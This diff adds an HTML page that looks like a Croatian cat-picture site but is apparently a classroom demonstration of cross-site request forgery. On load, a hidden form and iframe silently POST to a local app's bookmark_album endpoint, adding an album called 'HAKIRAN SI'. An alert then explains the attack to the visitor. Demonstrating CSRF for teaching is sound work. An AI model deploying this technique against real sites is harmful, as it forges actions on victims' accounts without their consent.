@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="hr">
+    <head>
+        <meta charset="UTF-8" />
+        <title>Najbolje mačje slike 2026! 🐱</title>
+    </head>
+    <body>
+        <h1>Dobrodošli na najbolju stranicu s mačkama! 🐾</h1>
+        <p>Ništa sumnjivo ovdje, samo slatke mačke...</p>
+        <img src="https://placecats.com/400/300" alt="slatka mačka" />
+
+        <iframe name="csrf-frame" style="display: none"></iframe>
+
+        <form
+            id="csrf-form"
+            action="http://localhost:8000/app/bookmark_album/"
+            method="POST"
+            target="csrf-frame"
+        >
+            <input type="hidden" name="album_title" value="HAKIRAN SI" />
+            <input type="hidden" name="album_author" value="CSRF Napadač" />
+        </form>
+
+        <script>
+            document.getElementById('csrf-form').submit()
+
+            setTimeout(function () {
+                alert(
+                    '⚠️ Doživio/la si CSRF napad!\n\n' +
+                        'Dok si gledao/la mačke, ova stranica je u tvoje ime poslala\n' +
+                        'POST zahtjev na bookmark_album endpoint i dodala je album\n' +
+                        '"HAKIRAN SI" od autora "CSRF Napadač" na tvoj račun — ' +
+                        'bez tvog pristanka i bez da si išta kliknuo/la.',
+                )
+            }, 800)
+        </script>
+    </body>
+</html>
